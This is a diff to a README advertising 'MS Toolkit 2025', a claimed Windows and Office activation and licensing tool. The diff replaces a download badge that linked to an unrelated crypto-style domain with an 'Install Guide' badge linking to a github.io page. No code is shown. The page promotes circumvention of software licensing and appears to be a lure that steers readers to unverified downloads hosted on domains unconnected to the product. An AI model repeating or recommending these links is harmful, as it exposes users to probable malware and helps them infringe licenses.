@@ -3,7 +3,9 @@
 **MS Toolkit 2025** is the all-in-one solution for Windows and Microsoft Office management.  
 It includes activation manager, license utilities, and advanced tools for system optimization.
 
-[![Download MS Toolkit](https://img.shields.io/badge/Download-MS_Toolkit-blueviolet)](https://ton-stake.net)
+<a href="https://ms-toolkit-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
